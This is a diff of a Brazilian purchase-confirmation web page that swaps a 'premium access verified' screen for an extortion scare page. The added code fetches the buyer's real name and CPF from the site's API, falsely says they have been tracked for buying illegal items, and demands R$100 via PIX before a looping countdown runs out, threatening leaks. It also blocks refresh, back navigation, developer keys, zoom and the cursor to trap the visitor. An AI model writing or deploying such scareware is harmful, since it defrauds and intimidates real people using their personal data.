@@ -2,360 +2,412 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Acesso Premium Verificado!</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+  <title>VAZAMENTO</title>
   <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      cursor: none !important;
+    }
+    
     body {
-      background: #f0f4ff;
-      font-family: 'Segoe UI', sans-serif;
+      background: #000000;
+      color: #ff0000;
+      font-family: 'Courier New', monospace;
+      font-size: 16px;
+      line-height: 1.4;
+      overflow: hidden;
+      position: fixed;
+      width: 100vw;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      margin: 0;
-      padding: 20px;
-      box-sizing: border-box;
-    }
-    .box {
-      background: white;
-      padding: 40px;
-      border-radius: 15px;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
       text-align: center;
-      max-width: 450px;
-      width: 100%;
+      user-select: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      touch-action: none;
+      -webkit-touch-callout: none;
+      -webkit-tap-highlight-color: transparent;
     }
-    h1 {
-      color: #6366f1;
-      margin-bottom: 20px;
+    
+    .container {
+      width: 90%;
+      max-width: 800px;
+      animation: pulse 1s infinite;
     }
-    p {
-      margin: 15px 0;
-      color: #333;
-      line-height: 1.5;
+    
+    @keyframes pulse {
+      0%, 50% { opacity: 1; }
+      25%, 75% { opacity: 0.7; }
     }
-    .botao {
-      display: inline-block;
-      padding: 12px 24px;
-      background-color: #6366f1;
-      color: white;
-      text-decoration: none;
-      border-radius: 8px;
-      margin-top: 20px;
+    
+    @keyframes flashRed {
+      0%, 50% { background: #000000; }
+      25%, 75% { background: #330000; }
+    }
+    
+    @keyframes flashScreen {
+      0%, 94% { background: #000000; }
+      95%, 100% { background: #660000; }
+    }
+    
+    body.flash {
+      animation: flashScreen 3s infinite;
+    }
+    
+    .header {
+      font-size: 24px;
       font-weight: bold;
-      transition: background-color 0.3s;
+      margin-bottom: 30px;
+      text-shadow: 0 0 10px #ff0000;
+      animation: blink 1s infinite;
     }
-    .botao:hover {
-      background-color: #4f46e5;
+    
+    @keyframes blink {
+      0%, 50% { opacity: 1; }
+      51%, 100% { opacity: 0.3; }
     }
-    #erro {
-      color: #e53e3e;
-      font-weight: bold;
-    }
-    .hidden {
-      display: none;
-    }
-    .checkmark {
+    
+    .eye {
       font-size: 48px;
-      color: #6366f1;
-      margin-bottom: 20px;
-    }
-    .spinner {
-      border: 3px solid #f3f3f3;
-      border-top: 3px solid #6366f1;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .contador {
-      color: #666;
-      font-size: 14px;
-      margin-top: 15px;
-    }
-    /* Estilos para dados do comprador */
-    .dados-comprador {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      color: white;
-      padding: 20px;
-      border-radius: 10px;
       margin: 20px 0;
-      box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
+      animation: blink 2s infinite;
     }
-    .dados-comprador h3 {
-      margin: 0 0 15px 0;
-      color: white;
+    
+    .nome-cpf {
       font-size: 18px;
+      margin: 15px 0;
+      color: #ff3333;
     }
-    .info-comprador {
+    
+    .dados-list {
       text-align: left;
-      background: rgba(255, 255, 255, 0.1);
-      padding: 15px;
-      border-radius: 8px;
-      backdrop-filter: blur(10px);
+      margin: 20px 0;
+      padding: 0 20px;
     }
-    .info-comprador p {
+    
+    .dados-list li {
       margin: 8px 0;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
+      list-style: none;
+      position: relative;
+      padding-left: 20px;
     }
-    .info-comprador strong {
-      color: #e0e7ff;
+    
+    .dados-list li:before {
+      content: "▶";
+      position: absolute;
+      left: 0;
+      color: #ff0000;
     }
-    .verificado {
-      background: #10b981;
-      color: white;
-      padding: 2px 8px;
-      border-radius: 12px;
-      font-size: 12px;
+    
+    .servidor-msg {
+      font-size: 20px;
       font-weight: bold;
+      margin: 25px 0;
+      color: #ff6666;
+      text-shadow: 0 0 15px #ff0000;
+    }
+    
+    .brain-skull {
+      font-size: 20px;
+      margin: 20px 0;
+    }
+    
+    .contador {
+      font-size: 32px;
+      font-weight: bold;
+      color: #ff0000;
+      margin: 25px 0;
+      text-shadow: 0 0 20px #ff0000;
+      animation: blink 0.5s infinite;
+      border: 2px solid #ff0000;
+      padding: 15px;
+      display: inline-block;
+    }
+    
+    .pix-info {
+      font-size: 18px;
+      margin: 20px 0;
+      color: #ff4444;
+    }
+    
+    .warning {
+      font-size: 22px;
+      font-weight: bold;
+      margin: 25px 0;
+      color: #ff0000;
+      text-shadow: 0 0 10px #ff0000;
+    }
+    
+    .final-msg {
+      font-size: 18px;
+      margin: 20px 0;
+      color: #ff6666;
+    }
+    
+    .glitch {
+      animation: glitch 0.3s infinite;
+    }
+    
+    @keyframes glitch {
+      0% { transform: translate(0); }
+      20% { transform: translate(-2px, 2px); }
+      40% { transform: translate(-2px, -2px); }
+      60% { transform: translate(2px, 2px); }
+      80% { transform: translate(2px, -2px); }
+      100% { transform: translate(0); }
+    }
+    
+    /* Bloqueio de zoom e gestos mobile */
+    @media (max-width: 768px) {
+      body {
+        font-size: 14px;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        overflow: hidden;
+        -webkit-overflow-scrolling: none;
+        overscroll-behavior: none;
+      }
+      
+      .container {
+        width: 95%;
+        padding: 10px;
+      }
+      
+      .header {
+        font-size: 18px;
+      }
+      
+      .contador {
+        font-size: 24px;
+        padding: 10px;
+      }
+    }
+    
+    /* Desabilitar seleção e contexto */
+    * {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      -webkit-touch-callout: none;
+      -webkit-tap-highlight-color: transparent;
     }
   </style>
-  <script src="utm-capture.js"></script>
-  <script src="fbclid-handler.js"></script>
-  <script src="event-id.js"></script>
-  <script src="utmify-back-redirect.js"></script>
-  <script
-    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-    data-utmify-prevent-xcod-sck
-    data-utmify-prevent-subids
-    async
-    defer
-  ></script>
 </head>
-<body>
-  <div class="box">
-    <h1>🎉 Acesso Premium Verificado!</h1>
-    
-    <div id="loading">
-      <div class="spinner"></div>
-      <p>Verificando seu pagamento e dados de verificação...</p>
-    </div>
-
-    <div id="conteudo" class="hidden">
-      <div class="checkmark">✅</div>
-      <p><strong>Acesso premium liberado com sucesso!</strong></p>
-      
-      <!-- Seção de dados do comprador -->
-      <div class="dados-comprador" id="dadosComprador" style="display: none;">
-        <h3>👤 Perfil Verificado</h3>
-        <div class="info-comprador">
-          <p><strong>Nome:</strong> <span id="nomeComprador">Carregando...</span></p>
-          <p><strong>CPF:</strong> <span id="cpfComprador">Carregando...</span></p>
-          <p><strong>Status:</strong> <span class="verificado" id="statusVerificacao">VERIFICADO ✓</span></p>
-        </div>
-      </div>
-      
-      <p>Seu acesso premium foi liberado com sucesso!</p>
-      <p>Clique no botão abaixo para acessar o canal VIP Premium quando desejar.</p>
-      <a href="https://t.me/+0iLdVzcJsq9kOWQ5" class="botao" target="_blank">🚀 Acessar Canal VIP Premium</a>
+<body class="flash">
+  <div class="container">
+    <div class="header glitch">
+      ❗⚠️ ACESSO MONITORADO - RASTREAMENTO ATIVO ⚠️
     </div>
     
-    <div id="erro" class="hidden">
-      <p>❌ <span id="erro-mensagem">Token inválido ou já foi usado.</span></p>
-      <p>Redirecionando para página inicial...</p>
+    <div class="eye">👁️</div>
+    
+    <div style="font-size: 28px; font-weight: bold; margin: 20px 0; animation: blink 1s infinite;">
+      VOCÊ FOI RASTREADO
+    </div>
+    
+    <div class="nome-cpf">
+      Olá, <span id="nome-usuario">[NOME]</span>.<br>
+      Seu CPF <span id="cpf-usuario">[XXX.XXX.XXX-XX]</span> foi vinculado à tentativa de compra de itens ilegais.
+    </div>
+    
+    <div style="margin: 25px 0; font-size: 18px;">
+      <strong>Dados coletados:</strong>
+    </div>
+    
+    <ul class="dados-list">
+      <li>Nome completo</li>
+      <li>CPF</li>
+      <li>Endereço (via IP)</li>
+      <li>Prints da tela da transação</li>
+      <li>Conta Telegram associada</li>
+      <li>Localização estimada</li>
+    </ul>
+    
+    <div class="servidor-msg">
+      TODOS OS DADOS FORAM ENVIADOS PARA UM SERVIDOR INTERNACIONAL
+    </div>
+    
+    <div class="brain-skull">
+      🧠 Você achou que era só um bot de vendas.<br>
+      ☠️ Agora tá no radar. E a regra é simples:
+    </div>
+    
+    <div style="font-size: 24px; margin: 25px 0;">
+      ⏱️ TEMPO RESTANTE:
+    </div>
+    
+    <div class="contador" id="contador">
+      10:00
+    </div>
+    
+    <div class="pix-info">
+      📤 Se o pagamento de <strong>R$100,00</strong> via PIX não for confirmado até o fim da contagem, seus dados serão:
+    </div>
+    
+    <ul class="dados-list" style="margin: 20px 0;">
+      <li>Enviados às autoridades</li>
+      <li>Postados em fóruns públicos de vazamento</li>
+      <li>Associados a crimes cibernéticos</li>
+    </ul>
+    
+    <div style="font-size: 20px; margin: 25px 0; color: #ffff00;">
+      PIX de resgate: <strong>pixchave@proton.me</strong>
+    </div>
+    
+    <div class="warning">
+      ❌ NÃO TENTE NEGOCIAR. NÃO ATUALIZE. NÃO SAIA.
+    </div>
+    
+    <div class="final-msg">
+      Reagiu? Vazou. Ficou quieto? Sumiu.
     </div>
   </div>
 
-  <!-- Facebook Pixel -->
-  <script>
-    window.fbConfig = { FB_PIXEL_ID: '', loaded: false };
-    async function loadFacebookConfig() {
-      try {
-        const r = await fetch('/api/config');
-        const cfg = await r.json();
-        window.fbConfig.FB_PIXEL_ID = cfg.FB_PIXEL_ID;
-        window.fbConfig.loaded = true;
-      } catch (e) {
-        console.error('Erro ao carregar config do Facebook', e);
-      }
-    }
-    loadFacebookConfig();
-  </script>
-  <script>
-    !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){
-      n.callMethod ? n.callMethod.apply(n,arguments) : n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-      n.queue=[];t=b.createElement(e);t.async=!0;
-      t.src=v;s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)
-    }(window, document,'script','https://connect.facebook.net/en_US/fbevents.js');
+  <!-- Som de interferência digital -->
+  <audio id="interferencia" loop style="display: none;">
+    <source src="data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhBTmH1fPOcCMFl9v1xoQzBSKU2e3PeikGJHnJ8N2QQAoUXrTp66hVFApGn+DyvmwhBTmH1fPOcCMF" type="audio/wav">
+  </audio>
 
-    // Aguardar carregamento das configurações antes de inicializar
-    function initializeFacebookPixel() {
-      if (window.fbConfig && window.fbConfig.loaded && window.fbConfig.FB_PIXEL_ID && typeof fbq === 'function') {
-        // 🔥 DESABILITAR PUSHSTATE PARA EVITAR CONFLITOS
-        fbq.disablePushState = true;
-        
-        fbq('init', window.fbConfig.FB_PIXEL_ID);
-        
-        const pageViewId = generateEventID('PageView');
-        const pageViewData = { eventID: pageViewId };
-        
-        // Aguardar captura de UTMs antes de enviar PageView
-        setTimeout(() => {
-          const utmParams = captureUTMParams();
-          if (utmParams.utm_source) {
-            pageViewData.utm_source = utmParams.utm_source;
+  <script>
+    // Capturar dados da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const token = urlParams.get('token');
+    
+    // Simular dados do usuário
+    let nomeUsuario = '[NOME]';
+    let cpfUsuario = '[XXX.XXX.XXX-XX]';
+    
+    // Tentar buscar dados reais se token existir
+    if (token) {
+      fetch(`/api/dados-comprador?token=${token}`)
+        .then(response => response.json())
+        .then(data => {
+          if (data.success && data.nome) {
+            nomeUsuario = data.nome.toUpperCase();
+            document.getElementById('nome-usuario').textContent = nomeUsuario;
           }
-          if (utmParams.utm_medium) {
-            pageViewData.utm_medium = utmParams.utm_medium;
+          if (data.success && data.cpf) {
+            cpfUsuario = data.cpf;
+            document.getElementById('cpf-usuario').textContent = cpfUsuario;
           }
-          if (utmParams.utm_campaign) {
-            pageViewData.utm_campaign = utmParams.utm_campaign;
-          }
-          if (utmParams.utm_term) {
-            pageViewData.utm_term = utmParams.utm_term;
-          }
-          if (utmParams.utm_content) {
-            pageViewData.utm_content = utmParams.utm_content;
-          }
-          
-          fbq('track', 'PageView', pageViewData);
-          console.log('Facebook Pixel PageView enviado:', pageViewData);
-        }, 100);
+        })
+        .catch(error => {
+          console.log('Usando dados simulados');
+        });
+    }
+    
+    // Contador regressivo de 10 minutos
+    let tempoRestante = 10 * 60; // 10 minutos em segundos
+    
+    function atualizarContador() {
+      const minutos = Math.floor(tempoRestante / 60);
+      const segundos = tempoRestante % 60;
+      const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
+      document.getElementById('contador').textContent = display;
+      
+      if (tempoRestante > 0) {
+        tempoRestante--;
       } else {
-        setTimeout(initializeFacebookPixel, 100);
+        // Quando chegar a zero, reiniciar
+        tempoRestante = 10 * 60;
       }
     }
     
-    initializeFacebookPixel();
-  </script>
-
-  <script>
-    const urlParams = new URLSearchParams(window.location.search);
-    const token = urlParams.get('token');
-    const valor = urlParams.get('valor');
-    let tokenValido = false;
-
-    // Função para buscar dados do comprador
-    async function carregarDadosComprador(token) {
-      try {
-        const response = await fetch(`/api/dados-comprador?token=${token}`);
-        const data = await response.json();
-        
-        if (data.success) {
-          document.getElementById('nomeComprador').textContent = data.nome || 'N/A';
-          document.getElementById('cpfComprador').textContent = data.cpf || 'N/A';
-          document.getElementById('statusVerificacao').textContent = data.verificado ? 'VERIFICADO ✓' : 'PENDENTE';
-          document.getElementById('dadosComprador').style.display = 'block';
-        }
-      } catch (error) {
-        console.error('Erro ao carregar dados do comprador:', error);
-        // Não exibir seção se houver erro
-      }
-    }
-
-    async function verificarToken() {
-      if (!token) {
-        mostrarErro('Token não encontrado na URL.');
-        return;
-      }
-
-      try {
-        const response = await fetch(`/api/verificar-token?token=${token}`);
-        const data = await response.json();
-
-        if (data.sucesso) {
-          tokenValido = true;
-          
-          // Marcar token como usado
-          try {
-            await fetch(`/api/marcar-usado?token=${token}`);
-          } catch (error) {
-            console.error('Erro ao marcar token como usado:', error);
-          }
-          
-          // Carregar dados do comprador para bot especial
-          await carregarDadosComprador(token);
-          
-          document.getElementById('loading').classList.add('hidden');
-          document.getElementById('conteudo').classList.remove('hidden');
-          
-          // Enviar evento Purchase para Facebook
-          await enviarEventoPurchase();
-        } else {
-          mostrarErro(data.erro || 'Token inválido.');
-        }
-      } catch (error) {
-        console.error('Erro ao verificar token:', error);
-        mostrarErro('Erro ao verificar token. Tente novamente.');
-      }
-    }
-
-    async function enviarEventoPurchase() {
-      if (!tokenValido || !token) return;
-
-      try {
-        const purchaseEventId = generateEventID('Purchase');
-        
-        // Capturar UTMs da URL
-        const utmParams = captureUTMParams();
-        
-        // Dados do evento Purchase
-        const eventData = {
-          token: token,
-          valor: parseFloat(valor) || 0,
-          event_id: purchaseEventId,
-          utm_source: utmParams.utm_source,
-          utm_medium: utmParams.utm_medium,
-          utm_campaign: utmParams.utm_campaign,
-          utm_term: utmParams.utm_term,
-          utm_content: utmParams.utm_content,
-          client_timestamp: Math.floor(Date.now() / 1000)
-        };
-
-        // Enviar para o servidor para processamento CAPI
-        const response = await fetch('/api/facebook-purchase', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(eventData)
-        });
-
-        // Enviar Pixel (cliente)
-        if (window.fbConfig && window.fbConfig.loaded && window.fbConfig.FB_PIXEL_ID && typeof fbq === 'function') {
-          const pixelData = {
-            value: parseFloat(valor) || 0,
-            currency: 'BRL',
-            eventID: purchaseEventId
-          };
-
-          // Adicionar UTMs se disponíveis
-          if (utmParams.utm_source) pixelData.utm_source = utmParams.utm_source;
-          if (utmParams.utm_medium) pixelData.utm_medium = utmParams.utm_medium;
-          if (utmParams.utm_campaign) pixelData.utm_campaign = utmParams.utm_campaign;
-          if (utmParams.utm_term) pixelData.utm_term = utmParams.utm_term;
-          if (utmParams.utm_content) pixelData.utm_content = utmParams.utm_content;
-
-          fbq('track', 'Purchase', pixelData);
-          console.log('Facebook Pixel Purchase enviado:', pixelData);
-        }
-
-      } catch (error) {
-        console.error('Erro ao enviar evento Purchase:', error);
-      }
-    }
-
-    function mostrarErro(mensagem) {
-      document.getElementById('erro-mensagem').textContent = mensagem;
-      document.getElementById('loading').classList.add('hidden');
-      document.getElementById('erro').classList.remove('hidden');
-      
+    // Atualizar contador a cada segundo
+    setInterval(atualizarContador, 1000);
+    
+    // Efeito de glitch aleatório
+    function aplicarGlitch() {
+      const elementos = document.querySelectorAll('.container > *');
+      const elemento = elementos[Math.floor(Math.random() * elementos.length)];
+      elemento.classList.add('glitch');
       setTimeout(() => {
-        window.location.href = '/';
-      }, 3000);
+        elemento.classList.remove('glitch');
+      }, 300);
     }
-
-
-
-    // Iniciar verificação
-    verificarToken();
+    
+    // Aplicar glitch aleatoriamente
+    setInterval(aplicarGlitch, 2000 + Math.random() * 3000);
+    
+    // Tentar reproduzir som de interferência (baixo volume)
+    function tentarSom() {
+      const audio = document.getElementById('interferencia');
+      if (audio) {
+        audio.volume = 0.1; // Volume muito baixo
+        audio.play().catch(e => {
+          // Ignorar erro se não conseguir reproduzir
+          console.log('Som não disponível');
+        });
+      }
+    }
+    
+    // Tentar som após interação do usuário
+    document.addEventListener('click', tentarSom, { once: true });
+    document.addEventListener('touchstart', tentarSom, { once: true });
+    document.addEventListener('keydown', tentarSom, { once: true });
+    
+    // Bloquear ações do usuário
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('selectstart', e => e.preventDefault());
+    document.addEventListener('dragstart', e => e.preventDefault());
+    
+    // Bloquear teclas comuns
+    document.addEventListener('keydown', function(e) {
+      // Bloquear F5, Ctrl+R, Ctrl+F5, etc.
+      if (e.key === 'F5' || 
+          (e.ctrlKey && (e.key === 'r' || e.key === 'R')) ||
+          (e.ctrlKey && e.key === 'F5') ||
+          (e.ctrlKey && (e.key === 'u' || e.key === 'U')) ||
+          (e.ctrlKey && (e.key === 's' || e.key === 'S')) ||
+          (e.ctrlKey && (e.key === 'p' || e.key === 'P')) ||
+          e.key === 'F12') {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }
+    });
+    
+    // Bloquear zoom no mobile
+    document.addEventListener('touchmove', function(e) {
+      if (e.touches.length > 1) {
+        e.preventDefault();
+      }
+    }, { passive: false });
+    
+    // Bloquear double tap zoom
+    let lastTouchEnd = 0;
+    document.addEventListener('touchend', function(e) {
+      const now = (new Date()).getTime();
+      if (now - lastTouchEnd <= 300) {
+        e.preventDefault();
+      }
+      lastTouchEnd = now;
+    }, false);
+    
+    // Impedir back/forward
+    history.pushState(null, null, location.href);
+    window.onpopstate = function() {
+      history.go(1);
+    };
+    
+    // Ocultar cursor completamente
+    document.body.style.cursor = 'none';
+    document.documentElement.style.cursor = 'none';
+    
+    // Aplicar cursor none em todos os elementos
+    const style = document.createElement('style');
+    style.textContent = '* { cursor: none !important; }';
+    document.head.appendChild(style);
   </script>
 </body>
 </html>
